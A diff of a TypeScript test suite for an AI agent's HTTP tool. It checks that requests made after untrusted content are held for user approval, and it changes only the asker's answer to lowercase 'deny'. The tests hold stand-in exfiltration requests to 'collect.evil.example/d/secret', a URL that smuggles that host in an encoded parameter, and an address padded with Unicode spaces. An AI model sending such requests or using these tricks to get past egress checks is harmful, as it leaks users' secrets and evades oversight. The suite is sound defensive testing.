@@ -56,7 +56,7 @@ const call = (agent: Agent, input: Record<string, unknown>): Promise<Result> =>
 describe('http_request GET after foreign content', () => {
   it('a GET with data in the path is asked about as a read, and not sent without a yes', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     const result = await call(agent, { url: 'https://collect.evil.example/d/secret' });
     expect(ask.asked).toHaveLength(1);
@@ -69,7 +69,7 @@ describe('http_request GET after foreign content', () => {
 
   it('CONTROL: without foreign content before it, the same GET is not asked about', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'nothing named', false);
     await call(agent, { url: 'https://collect.evil.example/d/secret' });
     expect(ask.asked).toEqual([]);
@@ -78,7 +78,7 @@ describe('http_request GET after foreign content', () => {
 
   it('CONTROL: a GET of a host the owner named is not asked about', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'the API is api.example.ch');
     await call(agent, { url: 'https://api.example.ch/v1/items' });
     expect(ask.asked).toEqual([]);
@@ -87,7 +87,7 @@ describe('http_request GET after foreign content', () => {
 
   it('a GET of an address a search listed is not asked about, but the same GET with a header is', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     agent.searchResultAddresses.noteResults('items', ['https://news.example.org/feed']);
     await call(agent, { url: 'https://news.example.org/feed' });
@@ -101,7 +101,7 @@ describe('http_request GET after foreign content', () => {
 describe('http_request GET: the listed address and an address it carries', () => {
   it('a listed address with Unicode spaces appended is asked about', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     agent.searchResultAddresses.noteResults('items', ['https://news.example.org/feed']);
     await call(agent, { url: 'https://news.example.org/feed\u3000\u2003' });
@@ -112,7 +112,7 @@ describe('http_request GET: the listed address and an address it carries', () =>
   it('a GET of a named host whose address carries another one is asked about, headers or not', async () => {
     for (const extra of [{}, { headers: { Accept: 'application/json' } }]) {
       const tool = http();
-      const ask = asker('Deny');
+      const ask = asker('deny');
       const agent = agentOf(tool, ask.fn, 'the API is api.example.ch');
       await call(agent, { url: 'https://api.example.ch/proxy?u=https%3A%2F%2Fcollect.evil.example%2Fd', ...extra });
       expect(ask.asked).toHaveLength(1);
@@ -123,7 +123,7 @@ describe('http_request GET: the listed address and an address it carries', () =>
 
   it('CONTROL: a write whose address carries another one keeps its own check, not the read question', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'the API is api.example.ch');
     await call(agent, { url: 'https://api.example.ch/hooks?u=https://collect.evil.example', method: 'POST', body: '{}' });
     expect(ask.asked).toEqual([]);
@@ -146,7 +146,7 @@ describe('http_request after foreign content: the policy\'s own hosts count for 
   it('a GET of a floor host, exact or under a floor wildcard, and of a baseline host is not asked about', async () => {
     for (const policy of ['guarded', 'allow-all', undefined] as const) {
       const tool = http();
-      const ask = asker('Deny');
+      const ask = asker('deny');
       const agent = withPolicy(agentOf(tool, ask.fn), policy);
       await call(agent, { url: 'https://floor.example/a' });
       await call(agent, { url: 'https://docs.wild.example/b' });
@@ -158,7 +158,7 @@ describe('http_request after foreign content: the policy\'s own hosts count for 
 
   it('a send to a floor host the owner did not name keeps asking', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = withPolicy(agentOf(tool, ask.fn), 'guarded');
     await call(agent, { url: 'https://floor.example/hooks', method: 'POST', body: '{"d":"secret"}' });
     expect(ask.asked).toHaveLength(1);
@@ -167,7 +167,7 @@ describe('http_request after foreign content: the policy\'s own hosts count for 
 
   it('the baseline\'s loopback names are not counted', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = withPolicy(agentOf(tool, ask.fn), 'guarded');
     await call(agent, { url: 'https://localhost/x' });
     await call(agent, { url: 'https://127.0.0.1/x' });
@@ -177,7 +177,7 @@ describe('http_request after foreign content: the policy\'s own hosts count for 
 
   it('a context that does not carry the instance\'s policy names nothing', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     Object.assign(agent.toolContext, { networkPolicy: 'guarded', allowedHosts: new Set(['floor.example']) });
     await call(agent, { url: 'https://floor.example/a' });
@@ -188,20 +188,20 @@ describe('http_request after foreign content: the policy\'s own hosts count for 
 
   it('under allow-list only the list counts, under deny-all nothing', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = withPolicy(agentOf(tool, ask.fn), 'allow-list');
     await call(agent, { url: 'https://floor.example/a' });
     expect(ask.asked).toEqual([]);
     await call(agent, { url: 'https://api.anthropic.com/v1/models' });
     expect(ask.asked).toHaveLength(1);
-    const denied = asker('Deny');
+    const denied = asker('deny');
     await call(withPolicy(agentOf(http(), denied.fn), 'deny-all'), { url: 'https://floor.example/a' });
     expect(denied.asked).toHaveLength(1);
   });
 
   it('CONTROL: a host neither the policy nor the owner names is asked about under guarded', async () => {
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = withPolicy(agentOf(tool, ask.fn), 'guarded');
     await call(agent, { url: 'https://collect.evil.example/d' });
     expect(ask.asked).toHaveLength(1);
@@ -224,7 +224,7 @@ describe('case 22: one host list, the engine\'s read and the tainted shell set',
   it('agrees on every host except the named differences, under allow-all', async () => {
     const { computeShellSet } = await import('../../shell-sidecar/egress.js');
     const tool = http();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'please read typed.example');
     readPolicy(agent, {
       networkPolicy: 'allow-all', allowedHosts: new Set(['floor.example']), allowedWildcards: ['wild.example'],
